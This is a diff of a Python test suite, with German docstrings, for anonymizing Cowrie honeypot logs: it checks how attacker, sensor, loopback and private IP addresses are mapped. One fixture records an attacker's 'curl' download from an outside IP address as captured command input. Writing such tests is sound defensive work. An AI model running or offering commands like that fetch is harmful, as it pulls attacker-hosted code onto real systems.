@@ -50,17 +50,44 @@ def test_ipv6_is_mapped_into_the_documentation_range():
     assert addresses.for_attacker("2a01:4f8:c17:3201::99").startswith("2001:db8::")
 
 
+def test_loopback_and_private_addresses_stay():
+    """127.0.0.1 gehört niemandem und markiert unsere eigenen Testsitzungen."""
+    addresses = make_fixtures.AddressMap()
+    assert addresses.for_attacker("127.0.0.1") == "127.0.0.1"
+    assert addresses.for_sensor("127.0.0.1") == "127.0.0.1"
+    assert addresses.for_attacker("10.0.0.5") == "10.0.0.5"
+
+
+def test_an_own_test_session_keeps_source_and_destination():
+    """Bei einer lokalen Sitzung sind Quelle und Ziel gleich.
+
+    Früher erbte das Ziel den Ersatz der Quelle, und der Honeypot sah aus wie
+    ein Angreifer.
+    """
+    events = [event(src_ip="127.0.0.1", dst_ip="127.0.0.1")]
+    cleaned = make_fixtures.anonymize(events, make_fixtures.AddressMap())
+    assert cleaned[0]["src_ip"] == "127.0.0.1"
+    assert cleaned[0]["dst_ip"] == "127.0.0.1"
+
+
+def test_the_sensor_wins_when_an_address_has_both_roles():
+    events = [event(src_ip="45.148.10.7", dst_ip="45.148.10.7")]
+    cleaned = make_fixtures.anonymize(events, make_fixtures.AddressMap())
+    assert cleaned[0]["dst_ip"] == "198.51.100.1"
+    assert cleaned[0]["src_ip"] == "198.51.100.1"
+
+
 def test_the_sensor_gets_its_own_replacement():
     addresses = make_fixtures.AddressMap()
     assert addresses.for_sensor("195.201.127.108") == "198.51.100.1"
 
 
 def test_longer_addresses_are_replaced_first():
-    """Sonst zerschneidet 10.1.1.1 einen Treffer in 10.1.1.10."""
+    """Sonst zerschneidet 45.148.10.1 einen Treffer in 45.148.10.10."""
     addresses = make_fixtures.AddressMap()
-    addresses.for_attacker("10.1.1.1")
-    addresses.for_attacker("10.1.1.10")
-    replaced = addresses.replace_everywhere("10.1.1.10")
+    addresses.for_attacker("45.148.10.1")
+    addresses.for_attacker("45.148.10.10")
+    replaced = addresses.replace_everywhere("45.148.10.10")
     assert replaced == "203.0.113.2"
 
 
@@ -82,9 +109,9 @@ def test_addresses_are_replaced_inside_commands_and_messages():
 
 def test_addresses_of_others_stay(mapped=None):
     """Eine fremde Adresse im Befehl gehört zur Untersuchung und bleibt."""
-    events = [event(eventid="cowrie.command.input", input="curl http://198.18.7.9/a")]
+    events = [event(eventid="cowrie.command.input", input="curl http://45.9.148.99/a")]
     cleaned = make_fixtures.anonymize(events, make_fixtures.AddressMap())
-    assert "198.18.7.9" in cleaned[0]["input"]
+    assert "45.9.148.99" in cleaned[0]["input"]
 
 
 def test_public_addresses_in_the_participant_fields_are_detected():
